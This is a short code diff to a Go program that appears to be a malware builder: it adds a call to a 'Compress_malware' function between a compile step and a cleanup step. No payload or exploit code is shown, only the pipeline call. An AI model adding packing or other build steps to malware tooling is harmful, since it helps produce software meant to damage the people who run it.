@@ -82,6 +82,9 @@ func main() {
 		// Compile file
 		io.Compile_file(structure.Send(object))
 
+		// Compresses the malware
+		io.Compress_malware(structure.Send(object))
+
 		// Cleanup
 		cleanup.Start(structure.Send(object))
 	}
